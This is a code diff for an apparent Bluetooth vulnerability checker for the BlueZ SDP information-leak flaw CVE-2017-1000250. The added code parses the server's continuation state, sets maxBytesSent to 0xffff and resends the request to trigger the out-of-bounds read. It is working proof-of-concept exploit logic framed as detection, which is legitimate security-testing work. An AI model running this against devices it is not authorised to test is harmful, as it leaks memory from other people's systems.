@@ -9,13 +9,24 @@
 #define INQUIRYLEN              15 // This value is multiplied by 1.28 seconds to get the hci_inquiry length
 #define MTU                     50
 #define SDP_PDU_SVC_PARAM_LEN   7
-#define SDP_PDU_ATTR_PARAM_LEN  14
+#define SDP_PDU_ATTR_PARAM_LEN  15
 #define SDP_SVC_ATTR_MASK       0x0000ffff
 #define SVC_L2CAP               0x0100
 #define TID_SEQ_UINT8           0x35
 #define TID_UINT64              0x0a
 #define TID_UUID_16             0x19
 #define TRANSACTION_ID          0x0000
+
+void cont_state_to_char(sdp_cont_state_bluez_t *cont_state, char *dest, uint8_t cont_len)
+{
+    memset(dest, 0, cont_len + 1);
+    uint8_t *len = (char *) dest;
+    *len = cont_len;
+    uint32_t *timestamp = (uint32_t *) (dest + sizeof(uint8_t));
+    *timestamp = htonl(cont_state->timestamp);
+    uint16_t *max_bytes = (uint16_t *) (dest + sizeof(uint8_t) + sizeof(uint32_t));
+    *max_bytes = htons(cont_state->cStateValue.maxBytesSent);
+}
 
 char * create_sdp_svc_attr_search_pdu(uint16_t service, char *continuation, size_t continuation_len)
 {
@@ -43,7 +54,7 @@ char * create_sdp_svc_attr_search_pdu(uint16_t service, char *continuation, size
     sdp_pdu_data_attr->data_value = htonl(SDP_SVC_ATTR_MASK);
 
     char *continuation_state = (char *) (pdu + sizeof(sdp_pdu_hdr_t) + sizeof(sdp_data_uuid16_t) + sizeof(uint16_t) + sizeof(sdp_data_uuid32_t));
-    if (continuation_len > 1)
+    if (continuation_len > 0)
     {
         memcpy(continuation_state, continuation, continuation_len);
     } else {
@@ -83,6 +94,32 @@ char * create_sdp_svc_search_pdu(uint16_t service, char *continuation, size_t co
     return pdu;
 }
 
+int extract_cont_state_from_sdp(sdp_cont_state_bluez_t *cont_state, char *pdu)
+{
+    sdp_pdu_hdr_t *pdu_header = (sdp_pdu_hdr_t *) pdu;
+    uint8_t svc_search_attr_rsp = SDP_SVC_SEARCH_ATTR_RSP;
+    size_t offset = 0;
+    if (pdu_header->pdu_id != svc_search_attr_rsp)
+        return -1;
+    offset += sizeof(sdp_pdu_hdr_t);
+    uint16_t *attr_list_byte_count = (uint16_t *) (pdu + offset);
+    *attr_list_byte_count = ntohs(*attr_list_byte_count);
+    offset += *attr_list_byte_count + sizeof(uint16_t);
+    uint8_t *cont_state_len = (uint8_t *) (pdu + offset);
+    char cont_state_value[*cont_state_len];
+    offset += sizeof(uint8_t);
+    memcpy(cont_state_value, (pdu + offset), *cont_state_len);
+
+    uint32_t *timestamp = (uint32_t *) (pdu + offset);
+    offset += sizeof(uint32_t);
+    uint16_t *max_bytes_sent = (uint16_t *) (pdu + offset);
+    
+    cont_state->timestamp = ntohl(*timestamp);
+    cont_state->cStateValue.maxBytesSent = ntohs(*max_bytes_sent);
+
+    return *cont_state_len;
+}
+
 int get_bluetooth_device_id(void)
 {
     return hci_get_route(NULL);
@@ -96,9 +133,11 @@ int is_valid_address(char *address)
 int is_vulnerable_to_cve_2017_1000250(bdaddr_t *target)
 {
     struct sockaddr_l2 addr = { 0 };
-    int sd, status, continuation_len = 1;
+    int sd, status;
+    uint8_t continuation_len = 0;
     int16_t mtu = MTU;
-    char *pdu, buf[MTU] = { 0 };
+    char *pdu, cont_state_s[9], buf[MTU] = { 0 };
+    sdp_cont_state_bluez_t cont_state = { 0 };
 
     // Return a negative integer indicating failure to create socket
     if ((sd = socket(AF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP)) < 0)
@@ -116,10 +155,25 @@ int is_vulnerable_to_cve_2017_1000250(bdaddr_t *target)
     if (connect(sd, (struct sockaddr *) &addr, sizeof(addr)) < 0)
         return -3;
     // Send initial PDU
-    if (write(sd, pdu, SDP_PDU_ATTR_PARAM_LEN + sizeof(sdp_pdu_hdr_t) + continuation_len) < 0)
+    if (write(sd, pdu, SDP_PDU_ATTR_PARAM_LEN + sizeof(sdp_pdu_hdr_t)) < 0)
         return -4;
     // Wait for fragmented response
-    if (read(sd, buf, MTU) < 0)
+    if ((status = read(sd, buf, MTU)) < 0)
+        return -5;
+    
+    if ((continuation_len = extract_cont_state_from_sdp(&cont_state, buf)) < 0)
+        return -6;
+
+    // Increase maximum number of bytes the server will send
+    cont_state.cStateValue.maxBytesSent = 0xffff;
+
+    cont_state_to_char(&cont_state, cont_state_s, continuation_len);
+
+    pdu = create_sdp_svc_attr_search_pdu(SVC_L2CAP, cont_state_s, continuation_len);
+    if (write(sd, pdu, SDP_PDU_ATTR_PARAM_LEN + sizeof(sdp_pdu_hdr_t) + sizeof(uint8_t) + continuation_len) < 0)
+        return -7;
+    
+    if ((status = read(sd, buf, MTU)) < 0)
         return -5;
 
     free(pdu);
